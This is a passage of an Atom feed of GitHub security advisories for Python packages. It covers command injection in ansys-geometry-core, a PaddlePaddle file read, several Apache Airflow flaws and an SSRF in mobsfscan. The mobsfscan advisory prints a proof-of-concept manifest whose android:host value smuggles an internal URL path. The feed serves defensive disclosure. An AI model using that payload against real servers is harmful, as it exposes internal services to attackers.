<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-03-25T20:01:25.057Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ansys-geometry-core] ansys-geometry-core OS Command Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-38jr-29fh-w9vm</id>
        <link href="https://github.com/advisories/GHSA-38jr-29fh-w9vm"/>
        <updated>2024-03-25T19:37:47.000Z</updated>
        <content type="html"><![CDATA[<p>subprocess call with shell=True identified, security issue.</p>
<h4 id="code">Code</h4>
<p>On file <a href="https://github.com/ansys/pyansys-geometry/blob/52cba1737a8a7812e5430099f715fa2160ec007b/src/ansys/geometry/core/connection/product_instance.py#L403-L428">src/ansys/geometry/core/connection/product_instance.py</a>:</p>
<pre><code>403 def _start_program(args: List[str], local_env: Dict[str, str]) -&gt; subprocess.Popen:
404     """
405     Start the program where the path is the first item of the ``args`` array argument.
406
407     Parameters
408     ----------
409     args : List[str]
410         List of arguments to be passed to the program. The first list's item shall
411         be the program path.
412     local_env : Dict[str,str]
413         Environment variables to be passed to the program.
414
415     Returns
416     -------
417     subprocess.Popen
418         The subprocess object.
419     """
420      return subprocess.Popen(
421         args,
422         shell=os.name != "nt",
423         stdin=subprocess.DEVNULL,
424         stdout=subprocess.DEVNULL,
425         stderr=subprocess.DEVNULL,
426         env=local_env,
427      )
428 
429 
</code></pre>
<p>Upon calling this method <code>_start_program</code> directly, users could exploit its usage to perform malicious operations on the current machine where the script is ran. With this resolution made through #1076 and #1077, we make sure that this method is only called from within the library and we are no longer enabling the <code>shell=True</code> option.</p>
<h4 id="cwe---78">CWE - 78</h4>
<p>For more information see <a href="https://cwe.mitre.org/data/definitions/78.html">https://cwe.mitre.org/data/definitions/78.html</a></p>
<h4 id="more-information">More information</h4>
<p>Visit <a href="https://bandit.readthedocs.io/en/1.7.8/plugins/b602_subprocess_popen_with_shell_equals_true.html">https://bandit.readthedocs.io/en/1.7.8/plugins/b602_subprocess_popen_with_shell_equals_true.html</a> to find out more information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ansys/pyansys-geometry/security/advisories/GHSA-38jr-29fh-w9vm">https://github.com/ansys/pyansys-geometry/security/advisories/GHSA-38jr-29fh-w9vm</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/pull/1076">https://github.com/ansys/pyansys-geometry/pull/1076</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/pull/1077">https://github.com/ansys/pyansys-geometry/pull/1077</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/commit/902071701c4f3a8258cbaa46c28dc0a65442d1bc">https://github.com/ansys/pyansys-geometry/commit/902071701c4f3a8258cbaa46c28dc0a65442d1bc</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/commit/f82346b9432b06532e84f3278125f5879b4e9f3f">https://github.com/ansys/pyansys-geometry/commit/f82346b9432b06532e84f3278125f5879b4e9f3f</a></li>
<li><a href="https://bandit.readthedocs.io/en/1.7.8/plugins/b602_subprocess_popen_with_shell_equals_true.html">https://bandit.readthedocs.io/en/1.7.8/plugins/b602_subprocess_popen_with_shell_equals_true.html</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/blob/52cba1737a8a7812e5430099f715fa2160ec007b/src/ansys/geometry/core/connection/product_instance.py#L403-L428">https://github.com/ansys/pyansys-geometry/blob/52cba1737a8a7812e5430099f715fa2160ec007b/src/ansys/geometry/core/connection/product_instance.py#L403-L428</a></li>
<li><a href="https://github.com/advisories/GHSA-38jr-29fh-w9vm">https://github.com/advisories/GHSA-38jr-29fh-w9vm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38jr-29fh-w9vm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:37:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansys-geometry-core] ansys-geometry-core OS Command Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-38jr-29fh-w9vm</id>
        <link href="https://github.com/advisories/GHSA-38jr-29fh-w9vm"/>
        <updated>2024-03-25T19:37:47.000Z</updated>
        <content type="html"><![CDATA[<p>subprocess call with shell=True identified, security issue.</p>
<h4 id="code">Code</h4>
<p>On file <a href="https://github.com/ansys/pyansys-geometry/blob/52cba1737a8a7812e5430099f715fa2160ec007b/src/ansys/geometry/core/connection/product_instance.py#L403-L428">src/ansys/geometry/core/connection/product_instance.py</a>:</p>
<pre><code>403 def _start_program(args: List[str], local_env: Dict[str, str]) -&gt; subprocess.Popen:
404     """
405     Start the program where the path is the first item of the ``args`` array argument.
406
407     Parameters
408     ----------
409     args : List[str]
410         List of arguments to be passed to the program. The first list's item shall
411         be the program path.
412     local_env : Dict[str,str]
413         Environment variables to be passed to the program.
414
415     Returns
416     -------
417     subprocess.Popen
418         The subprocess object.
419     """
420      return subprocess.Popen(
421         args,
422         shell=os.name != "nt",
423         stdin=subprocess.DEVNULL,
424         stdout=subprocess.DEVNULL,
425         stderr=subprocess.DEVNULL,
426         env=local_env,
427      )
428 
429 
</code></pre>
<p>Upon calling this method <code>_start_program</code> directly, users could exploit its usage to perform malicious operations on the current machine where the script is ran. With this resolution made through #1076 and #1077, we make sure that this method is only called from within the library and we are no longer enabling the <code>shell=True</code> option.</p>
<h4 id="cwe---78">CWE - 78</h4>
<p>For more information see <a href="https://cwe.mitre.org/data/definitions/78.html">https://cwe.mitre.org/data/definitions/78.html</a></p>
<h4 id="more-information">More information</h4>
<p>Visit <a href="https://bandit.readthedocs.io/en/1.7.8/plugins/b602_subprocess_popen_with_shell_equals_true.html">https://bandit.readthedocs.io/en/1.7.8/plugins/b602_subprocess_popen_with_shell_equals_true.html</a> to find out more information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ansys/pyansys-geometry/security/advisories/GHSA-38jr-29fh-w9vm">https://github.com/ansys/pyansys-geometry/security/advisories/GHSA-38jr-29fh-w9vm</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/pull/1076">https://github.com/ansys/pyansys-geometry/pull/1076</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/pull/1077">https://github.com/ansys/pyansys-geometry/pull/1077</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/commit/902071701c4f3a8258cbaa46c28dc0a65442d1bc">https://github.com/ansys/pyansys-geometry/commit/902071701c4f3a8258cbaa46c28dc0a65442d1bc</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/commit/f82346b9432b06532e84f3278125f5879b4e9f3f">https://github.com/ansys/pyansys-geometry/commit/f82346b9432b06532e84f3278125f5879b4e9f3f</a></li>
<li><a href="https://bandit.readthedocs.io/en/1.7.8/plugins/b602_subprocess_popen_with_shell_equals_true.html">https://bandit.readthedocs.io/en/1.7.8/plugins/b602_subprocess_popen_with_shell_equals_true.html</a></li>
<li><a href="https://github.com/ansys/pyansys-geometry/blob/52cba1737a8a7812e5430099f715fa2160ec007b/src/ansys/geometry/core/connection/product_instance.py#L403-L428">https://github.com/ansys/pyansys-geometry/blob/52cba1737a8a7812e5430099f715fa2160ec007b/src/ansys/geometry/core/connection/product_instance.py#L403-L428</a></li>
<li><a href="https://github.com/advisories/GHSA-38jr-29fh-w9vm">https://github.com/advisories/GHSA-38jr-29fh-w9vm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38jr-29fh-w9vm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:37:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[paddlepaddle] PaddlePaddle allows arbitrary file read via paddle.vision.ops.read_file]]></title>
        <id>https://github.com/advisories/GHSA-jwrc-3v3f-5cq5</id>
        <link href="https://github.com/advisories/GHSA-jwrc-3v3f-5cq5"/>
        <updated>2024-03-25T19:37:34.000Z</updated>
        <content type="html"><![CDATA[<p>paddlepaddle/paddle 2.6.0 allows arbitrary file read via paddle.vision.ops.read_file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1603">https://nvd.nist.gov/vuln/detail/CVE-2024-1603</a></li>
<li><a href="https://huntr.com/bounties/7739eced-73a3-4a96-afcd-9c753c55929e">https://huntr.com/bounties/7739eced-73a3-4a96-afcd-9c753c55929e</a></li>
<li><a href="https://github.com/PaddlePaddle/Paddle/blob/release/2.6/python/paddle/vision/ops.py#L1262">https://github.com/PaddlePaddle/Paddle/blob/release/2.6/python/paddle/vision/ops.py#L1262</a></li>
<li><a href="https://github.com/PaddlePaddle/Paddle/blob/release/2.6/python/paddle/vision/ops.py#L1295-L1334">https://github.com/PaddlePaddle/Paddle/blob/release/2.6/python/paddle/vision/ops.py#L1295-L1334</a></li>
<li><a href="https://github.com/advisories/GHSA-jwrc-3v3f-5cq5">https://github.com/advisories/GHSA-jwrc-3v3f-5cq5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jwrc-3v3f-5cq5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-23T21:30:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Improper Authentication in Apache Airflow]]></title>
        <id>https://github.com/advisories/GHSA-fh37-cx83-q542</id>
        <link href="https://github.com/advisories/GHSA-fh37-cx83-q542"/>
        <updated>2024-03-25T15:52:20.000Z</updated>
        <content type="html"><![CDATA[<p>The lineage endpoint of the deprecated Experimental API was not protected by authentication in Airflow 2.0.0. This allowed unauthenticated users to hit that endpoint. This is low-severity issue as the attacker needs to be aware of certain parameters to pass to that endpoint and even after can just get some metadata about a DAG and a Task. This issue only affects Apache Airflow 2.0.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26697">https://nvd.nist.gov/vuln/detail/CVE-2021-26697</a></li>
<li><a href="https://github.com/apache/airflow/commit/21cedff205e7d62675949fda2aa4616d77232b76">https://github.com/apache/airflow/commit/21cedff205e7d62675949fda2aa4616d77232b76</a></li>
<li><a href="https://lists.apache.org/thread.html/r36111262a59219a3e2704c71e97cf84937dae5ba7a1da99499e5d8f9@%3Cannounce.apache.org%3E">https://lists.apache.org/thread.html/r36111262a59219a3e2704c71e97cf84937dae5ba7a1da99499e5d8f9@%3Cannounce.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/re21fec81baea7a6d73b0b5d31efd07cc02c61f832e297f65bb19b519%40%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/re21fec81baea7a6d73b0b5d31efd07cc02c61f832e297f65bb19b519%40%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/re21fec81baea7a6d73b0b5d31efd07cc02c61f832e297f65bb19b519@%3Cdev.airflow.apache.org%3E">https://lists.apache.org/thread.html/re21fec81baea7a6d73b0b5d31efd07cc02c61f832e297f65bb19b519@%3Cdev.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/re21fec81baea7a6d73b0b5d31efd07cc02c61f832e297f65bb19b519@%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/re21fec81baea7a6d73b0b5d31efd07cc02c61f832e297f65bb19b519@%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2021/02/17/2">http://www.openwall.com/lists/oss-security/2021/02/17/2</a></li>
<li><a href="https://github.com/apache/airflow/commit/24a54242d56058846c7978130b3f37ca045d5142">https://github.com/apache/airflow/commit/24a54242d56058846c7978130b3f37ca045d5142</a></li>
<li><a href="https://github.com/apache/airflow/commit/93957e917ff4cfb0be11aef088bd9527cf728a04">https://github.com/apache/airflow/commit/93957e917ff4cfb0be11aef088bd9527cf728a04</a></li>
<li><a href="https://github.com/advisories/GHSA-fh37-cx83-q542">https://github.com/advisories/GHSA-fh37-cx83-q542</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fh37-cx83-q542</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-06-18T18:30:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow Cross-site scripting due to incomplete fix for CVE-2020-13944]]></title>
        <id>https://github.com/advisories/GHSA-86vp-x3pr-79rx</id>
        <link href="https://github.com/advisories/GHSA-86vp-x3pr-79rx"/>
        <updated>2024-03-25T15:44:15.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>origin</code> parameter passed to some of the endpoints like <code>/trigger</code> was vulnerable to XSS exploit. This issue affects Apache Airflow versions prior to 1.10.14. This is same as CVE-2020-13944 but the implemented fix in Airflow 1.10.13 did not fix the issue completely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17515">https://nvd.nist.gov/vuln/detail/CVE-2020-17515</a></li>
<li><a href="https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cannounce.apache.org%3E">https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cannounce.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cdev.airflow.apache.org%3E">https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cdev.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e%40%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e%40%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e@%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e@%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2020/12/11/2">http://www.openwall.com/lists/oss-security/2020/12/11/2</a></li>
<li><a href="https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367@%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367@%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2021/05/01/2">http://www.openwall.com/lists/oss-security/2021/05/01/2</a></li>
<li><a href="https://github.com/apache/airflow/pull/14738">https://github.com/apache/airflow/pull/14738</a></li>
<li><a href="https://github.com/apache/airflow/commit/409c249121bd9c8902fc2ba551b21873ab41f953">https://github.com/apache/airflow/commit/409c249121bd9c8902fc2ba551b21873ab41f953</a></li>
<li><a href="https://github.com/apache/airflow/releases/tag/1.10.15">https://github.com/apache/airflow/releases/tag/1.10.15</a></li>
<li><a href="https://github.com/apache/airflow/releases/tag/2.0.2">https://github.com/apache/airflow/releases/tag/2.0.2</a></li>
<li><a href="https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432@%3Cannounce.apache.org%3E">https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432@%3Cannounce.apache.org%3E</a></li>
<li><a href="https://pypi.org/project/apache-airflow">https://pypi.org/project/apache-airflow</a></li>
<li><a href="https://github.com/apache/airflow/commit/13336272e32872247fa7d17e964ccd88ec8d1376">https://github.com/apache/airflow/commit/13336272e32872247fa7d17e964ccd88ec8d1376</a></li>
<li><a href="https://github.com/apache/airflow/commit/7486153f451e4d2bb1c6fd9cbb5a63430157c99c">https://github.com/apache/airflow/commit/7486153f451e4d2bb1c6fd9cbb5a63430157c99c</a></li>
<li><a href="https://github.com/advisories/GHSA-86vp-x3pr-79rx">https://github.com/advisories/GHSA-86vp-x3pr-79rx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-86vp-x3pr-79rx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-04-20T16:40:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow Cross-site scripting due to incomplete fix for CVE-2020-13944]]></title>
        <id>https://github.com/advisories/GHSA-86vp-x3pr-79rx</id>
        <link href="https://github.com/advisories/GHSA-86vp-x3pr-79rx"/>
        <updated>2024-03-25T15:44:15.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>origin</code> parameter passed to some of the endpoints like <code>/trigger</code> was vulnerable to XSS exploit. This issue affects Apache Airflow versions prior to 1.10.14. This is same as CVE-2020-13944 but the implemented fix in Airflow 1.10.13 did not fix the issue completely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17515">https://nvd.nist.gov/vuln/detail/CVE-2020-17515</a></li>
<li><a href="https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cannounce.apache.org%3E">https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cannounce.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cdev.airflow.apache.org%3E">https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cdev.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r2892ef594dbbf54d0939b808626f52f7c2d1584f8aa1d81570847d2a@%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e%40%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e%40%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e@%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e@%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2020/12/11/2">http://www.openwall.com/lists/oss-security/2020/12/11/2</a></li>
<li><a href="https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367@%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367@%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2021/05/01/2">http://www.openwall.com/lists/oss-security/2021/05/01/2</a></li>
<li><a href="https://github.com/apache/airflow/pull/14738">https://github.com/apache/airflow/pull/14738</a></li>
<li><a href="https://github.com/apache/airflow/commit/409c249121bd9c8902fc2ba551b21873ab41f953">https://github.com/apache/airflow/commit/409c249121bd9c8902fc2ba551b21873ab41f953</a></li>
<li><a href="https://github.com/apache/airflow/releases/tag/1.10.15">https://github.com/apache/airflow/releases/tag/1.10.15</a></li>
<li><a href="https://github.com/apache/airflow/releases/tag/2.0.2">https://github.com/apache/airflow/releases/tag/2.0.2</a></li>
<li><a href="https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432@%3Cannounce.apache.org%3E">https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432@%3Cannounce.apache.org%3E</a></li>
<li><a href="https://pypi.org/project/apache-airflow">https://pypi.org/project/apache-airflow</a></li>
<li><a href="https://github.com/apache/airflow/commit/13336272e32872247fa7d17e964ccd88ec8d1376">https://github.com/apache/airflow/commit/13336272e32872247fa7d17e964ccd88ec8d1376</a></li>
<li><a href="https://github.com/apache/airflow/commit/7486153f451e4d2bb1c6fd9cbb5a63430157c99c">https://github.com/apache/airflow/commit/7486153f451e4d2bb1c6fd9cbb5a63430157c99c</a></li>
<li><a href="https://github.com/advisories/GHSA-86vp-x3pr-79rx">https://github.com/advisories/GHSA-86vp-x3pr-79rx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-86vp-x3pr-79rx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-04-20T16:40:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Insecure default config of Celery worker in Apache Airflow]]></title>
        <id>https://github.com/advisories/GHSA-9g2w-5f3v-mfmm</id>
        <link href="https://github.com/advisories/GHSA-9g2w-5f3v-mfmm"/>
        <updated>2024-03-25T15:26:34.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was found in Apache Airflow versions 1.10.10 and below. When using CeleryExecutor, if an attack can connect to the broker (Redis, RabbitMQ) directly, it was possible to insert a malicious payload directly to the broker which could lead to a deserialization attack (and thus remote code execution) on the Worker.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11982">https://nvd.nist.gov/vuln/detail/CVE-2020-11982</a></li>
<li><a href="https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://github.com/apache/airflow/commit/e91ecbea1b2daa0e243e1a2cfb30f1448d623aab">https://github.com/apache/airflow/commit/e91ecbea1b2daa0e243e1a2cfb30f1448d623aab</a></li>
<li><a href="https://github.com/advisories/GHSA-9g2w-5f3v-mfmm">https://github.com/advisories/GHSA-9g2w-5f3v-mfmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9g2w-5f3v-mfmm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2020-07-27T16:57:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Cross-Site Request Forgery (CSRF) in Apache Airflow]]></title>
        <id>https://github.com/advisories/GHSA-68wv-rjrm-576p</id>
        <link href="https://github.com/advisories/GHSA-68wv-rjrm-576p"/>
        <updated>2024-03-25T13:08:42.000Z</updated>
        <content type="html"><![CDATA[<p>In Apache Airflow 1.8.2 and earlier, a CSRF vulnerability allowed for a remote command injection on a default install of Airflow.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-17835">https://nvd.nist.gov/vuln/detail/CVE-2017-17835</a></li>
<li><a href="https://github.com/advisories/GHSA-68wv-rjrm-576p">https://github.com/advisories/GHSA-68wv-rjrm-576p</a></li>
<li><a href="https://lists.apache.org/thread.html/ade4d54ebf614f68dc81a08891755e60ea58ba88e0209233eeea5f57@%3Cdev.airflow.apache.org%3E">https://lists.apache.org/thread.html/ade4d54ebf614f68dc81a08891755e60ea58ba88e0209233eeea5f57@%3Cdev.airflow.apache.org%3E</a></li>
<li><a href="https://github.com/apache/airflow/commit/673026c740411cc6447aede8c6a816460fe03a59">https://github.com/apache/airflow/commit/673026c740411cc6447aede8c6a816460fe03a59</a></li>
<li><a href="https://github.com/apache/airflow/commit/c9dc9263986c1a55520ba44b6e5b0fcbd6c48712">https://github.com/apache/airflow/commit/c9dc9263986c1a55520ba44b6e5b0fcbd6c48712</a></li>
<li><a href="https://github.com/apache/airflow/commit/dca5e7d116b5c8b103df13f89f061757c13c41ae">https://github.com/apache/airflow/commit/dca5e7d116b5c8b103df13f89f061757c13c41ae</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68wv-rjrm-576p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2019-01-25T16:19:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mobsfscan] SSRF Vulnerability on assetlinks_check(act_name, well_knowns)]]></title>
        <id>https://github.com/advisories/GHSA-wfgj-wrgh-h3r3</id>
        <link href="https://github.com/advisories/GHSA-wfgj-wrgh-h3r3"/>
        <updated>2024-03-23T22:31:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>While examining the "App Link assetlinks.json file could not be found" vulnerability detected by MobSF, we, as the Trendyol Application Security team, noticed that a GET request was sent to the "/.well-known/assetlinks.json" endpoint for all hosts written with "android:host". In the AndroidManifest.xml file.</p>
<p>Since MobSF does not perform any input validation when extracting the hostnames in "android:host", requests can also be sent to local hostnames. This may cause SSRF vulnerability.</p>
<h3 id="details">Details</h3>
<p>Example &lt;intent-filter structure in AndroidManifest.xml:</p>
<pre><code>&lt;intent-filter android:autoVerify="true"&gt;
&lt;action android:name="android.intent.action.VIEW" /&gt;
&lt;category android:name="android.intent.category.DEFAULT" /&gt;
&lt;category android:name="android.intent.category.BROWSABLE" /&gt;
&lt;data android:host="192.168.1.102/user/delete/1#" android:scheme="http" /&gt;
&lt;/intent-filter&gt;
</code></pre>
<p>We defined it as android:host="192.168.1.102/user/delete/1#". Here, the "#" character at the end of the host prevents requests from being sent to the "/.well-known/assetlinks.json" endpoint and ensures that requests are sent to the endpoint before it.</p>
<img src="https://github.com/MobSF/Mobile-Security-Framework-MobSF/assets/150332295/c570cb00-e947-4ad7-af80-26d46c0ad3f7" alt="image" width="617">


<h3 id="poc">PoC</h3>
<p><a href="https://drive.google.com/file/d/1nbKMd2sKosbJef5Mh4DxjcHcQ8Hw0BNR/view?usp=share_link">https://drive.google.com/file/d/1nbKMd2sKosbJef5Mh4DxjcHcQ8Hw0BNR/view?usp=share_link</a></p>
<h3 id="impact">Impact</h3>
<p>The attacker can cause the server to make a connection to internal-only services within the organization's infrastructure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-wfgj-wrgh-h3r3">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-wfgj-wrgh-h3r3</a></li>
<li><a href="https://github.com/MobSF/mobsfscan/commit/61fd40b477bbf9d204eb8c5a83a86c396d839798">https://github.com/MobSF/mobsfscan/commit/61fd40b477bbf9d204eb8c5a83a86c396d839798</a></li>
<li><a href="https://github.com/MobSF/mobsfscan/commit/cd01b71770a6e56c1c71b0e5f454e7b6c9c64ef4">https://github.com/MobSF/mobsfscan/commit/cd01b71770a6e56c1c71b0e5f454e7b6c9c64ef4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29190">https://nvd.nist.gov/vuln/detail/CVE-2024-29190</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/5a8eeee73c5f504a6c3abdf2a139a13804efdb77">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/5a8eeee73c5f504a6c3abdf2a139a13804efdb77</a></li>
<li><a href="https://drive.google.com/file/d/1nbKMd2sKosbJef5Mh4DxjcHcQ8Hw0BNR/view?usp=share_link">https://drive.google.com/file/d/1nbKMd2sKosbJef5Mh4DxjcHcQ8Hw0BNR/view?usp=share_link</a></li>
<li><a href="https://github.com/advisories/GHSA-wfgj-wrgh-h3r3">https://github.com/advisories/GHSA-wfgj-wrgh-h3r3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wfgj-wrgh-h3r3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-22T23:54:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[prefect] Cross-Site Request Forgery vulnerability in Prefect]]></title>
        <id>https://github.com/advisories/GHSA-4hh5-2678-83fx</id>
        <link href="https://github.com/advisories/GHSA-4hh5-2678-83fx"/>
        <updated>2024-03-22T15:55:28.000Z</updated>
